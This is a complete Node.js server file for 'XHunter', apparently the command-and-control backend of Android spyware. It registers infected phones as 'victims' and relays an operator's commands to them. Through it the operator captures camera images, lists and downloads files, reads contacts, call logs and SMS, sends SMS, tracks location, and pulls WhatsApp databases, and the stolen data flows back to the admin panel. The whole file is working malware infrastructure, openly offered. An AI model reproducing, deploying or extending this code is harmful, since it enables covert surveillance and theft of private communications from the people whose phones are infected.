const express = require('express');
const app = express();
const server = require('http').createServer(app);
const { Server } = require('socket.io');
const path = require('path');

app.use(express.static('public'));

const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100MB
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

let victimList = {};
let deviceList = {};
let victimData = {};
let adminSocketId = null;
const PORT = process.env.PORT || 8080;

// Serve HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'ok', 
    message: 'XHunter Server is running',
    connectedDevices: Object.keys(victimList).length,
    adminConnected: adminSocketId !== null
  });
});

// API endpoint to get connected devices
app.get('/api/devices', (req, res) => {
  const devices = Object.keys(victimData).map(id => ({
    id: id,
    model: victimData[id].model,
    android: victimData[id].android,
    battery: victimData[id].battery,
    socketId: victimData[id].socketId,
    connected: true
  }));
  
  res.json({
    success: true,
    count: devices.length,
    devices: devices
  });
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log(`🔌 New connection: ${socket.id}`);
  
  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    console.log(`👑 Admin joined: ${socket.id}`);
    
    // Send all connected victims to admin
    if (Object.keys(victimData).length > 0) {
      Object.keys(victimData).forEach(key => {
        socket.emit("join", victimData[key]);
      });
    }
    
    socket.emit('adminConnected', {
      message: 'You are now connected as admin',
      victimCount: Object.keys(victimData).length
    });
  });
  
  // Handle admin requests
  socket.on('request', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing request:', error);
    }
  });
  
  // Torch control request
  socket.on('torchControlRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing torch request:', error);
    }
  });
  
  // Camera capture request
  socket.on('cameraCaptureRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing camera request:', error);
    }
  });
  
  // File directory request
  socket.on('getDirRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing dir request:', error);
    }
  });
  
  // Get directory by path
  socket.on('getDirByPathRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing dir by path request:', error);
    }
  });
  
  // Get installed apps
  socket.on('getInstalledAppsRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing apps request:', error);
    }
  });
  
  // Get contacts
  socket.on('getContactsRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing contacts request:', error);
    }
  });
  
  // Send SMS
  socket.on('sendSMSRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing SMS request:', error);
    }
  });
  
  // Get call log
  socket.on('getCallLogRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing call log request:', error);
    }
  });
  
  // Preview image
  socket.on('previewImageRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing preview image request:', error);
    }
  });
  
  // Get SMS
  socket.on('getSMSRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing get SMS request:', error);
    }
  });
  
  // Get location
  socket.on('getLocationRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing location request:', error);
    }
  });
  
  // Download file
  socket.on('downloadRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing download request:', error);
    }
  });
  
  // Download WhatsApp database
  socket.on('downloadWhatsappDatabaseRequest', (data) => {
    try {
      const { to, action, data: requestData } = JSON.parse(data);
      requestHandler(socket, to, action, requestData);
    } catch (error) {
      console.error('❌ Error parsing WhatsApp DB request:', error);
    }
  });
  
  // Victim device joins
  socket.on('join', (device) => {
    console.log(`📱 Victim joined: ${device.id} - ${device.model}`);
    
    victimList[device.id] = socket.id;
    victimData[device.id] = {
      ...device,
      socketId: socket.id,
      connectedAt: new Date().toISOString()
    };
    deviceList[socket.id] = {
      id: device.id,
      model: device.model,
      lastSeen: new Date().toISOString()
    };
    
    // Notify admin about new victim
    if (adminSocketId) {
      io.to(adminSocketId).emit("join", victimData[device.id]);
    }
    
    // Send confirmation to victim
    socket.emit('deviceRegistered', {
      success: true,
      message: 'Device registered successfully',
      deviceId: device.id
    });
  });
  
  // Handle responses from victims
  socket.on('getDir', (data) => responseHandler('getDir', data));
  socket.on('getInstalledApps', (data) => responseHandler('getInstalledApps', data));
  socket.on('getContacts', (data) => responseHandler('getContacts', data));
  socket.on('sendSMS', (data) => responseHandler('sendSMS', data));
  socket.on('getCallLog', (data) => responseHandler('getCallLog', data));
  socket.on('previewImage', (data) => responseHandler('previewImage', data));
  socket.on('error', (data) => responseHandler('error', data));
  socket.on('getSMS', (data) => responseHandler('getSMS', data));
  socket.on('getLocation', (data) => responseHandler('getLocation', data));
  
  // New features handlers
  socket.on('torchControlResult', (data) => responseHandler('torchControlResult', data));
  socket.on('cameraCaptureResult', (data) => responseHandler('cameraCaptureResult', data));
  
  // File download handlers
  socket.on('download', (data, callback) => {
    if (typeof callback === 'function') {
      callback("success");
    }
    responseHandler('download', data);
  });
  
  socket.on('downloadWhatsappDatabase', (data, callback) => {
    if (typeof callback === 'function') {
      callback("success");
    }
    responseHandler('downloadWhatsappDatabase', data);
  });
  
  // Handle disconnection
  socket.on('disconnect', () => {
    console.log(`❌ Connection closed: ${socket.id}`);
    
    if (socket.id === adminSocketId) {
      console.log('👑 Admin disconnected');
      adminSocketId = null;
    } else {
      // Find which victim disconnected
      let disconnectedDeviceId = null;
      Object.keys(victimList).forEach(deviceId => {
        if (victimList[deviceId] === socket.id) {
          disconnectedDeviceId = deviceId;
          delete victimList[deviceId];
          delete victimData[deviceId];
        }
      });
      
      Object.keys(deviceList).forEach(socketId => {
        if (socketId === socket.id) {
          delete deviceList[socketId];
        }
      });
      
      // Notify admin about disconnection
      if (adminSocketId && disconnectedDeviceId) {
        io.to(adminSocketId).emit('disconnectClient', disconnectedDeviceId);
      }
    }
  });
  
  // Ping handler to keep connection alive
  socket.on('ping', (data) => {
    socket.emit('pong', { timestamp: Date.now() });
  });
});

// Request handler function
function requestHandler(socket, to, action, data) {
  console.log(`📨 Request: ${action} -> ${to}`);
  
  if (!victimList[to]) {
    console.log(`❌ Victim ${to} not found`);
    if (socket.id === adminSocketId) {
      socket.emit('error', { error: `Device ${to} is not connected` });
    }
    return;
  }
  
  const victimSocketId = victimList[to];
  io.to(victimSocketId).emit(action, data);
}

// Response handler function
function responseHandler(action, data) {
  console.log(`📨 Response: ${action}`);
  
  if (adminSocketId) {
    io.to(adminSocketId).emit(action, data);
  } else {
    console.log(`⚠️ No admin connected to send response for: ${action}`);
  }
}

// Start server
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌐 Web panel: http://localhost:${PORT}`);
  console.log(`🔌 Socket.io ready for connections`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received. Shutting down gracefully...');
  io.close(() => {
    console.log('🔌 Socket.io closed');
    server.close(() => {
      console.log('🛑 HTTP server closed');
      process.exit(0);
    });
  });
});
